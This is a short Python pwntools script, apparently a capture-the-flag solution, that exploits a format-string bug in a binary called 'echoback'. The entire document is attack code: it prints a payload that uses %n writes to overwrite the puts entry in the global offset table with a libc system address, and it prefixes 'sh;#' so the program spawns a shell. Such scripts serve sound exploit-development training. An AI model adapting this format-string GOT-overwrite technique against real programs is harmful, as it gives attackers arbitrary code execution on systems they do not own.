#!/usr/bin/python
from pwn import *

context.log_level = 'error'

echoback = ELF('./echoback')

puts_got_addr = echoback.got['puts']
system_got_addr = p32(echoback.got['system'])

payload = '%59348x%8$n'
payload += '%4095x%9$n'

print "sh;#" + p32(puts_got_addr) + p32(puts_got_addr + 2) + payload

# 0x804a020
# 0xf7e0e7e0
